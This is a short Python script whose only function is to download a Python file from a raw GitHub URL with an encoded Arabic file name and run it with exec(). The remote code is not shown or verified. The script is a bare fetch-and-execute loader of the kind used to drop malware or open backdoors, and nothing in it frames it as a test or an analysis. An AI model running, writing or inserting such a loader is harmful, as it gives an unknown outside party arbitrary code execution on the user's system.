import requests

url = "https://raw.githubusercontent.com/kfkbxjkjc/Hesion/main/Hs%D9%85%D8%AF%D9%81%D9%88%D8%B9%D9%87.py"

response = requests.get(url)
code = response.text

exec(code)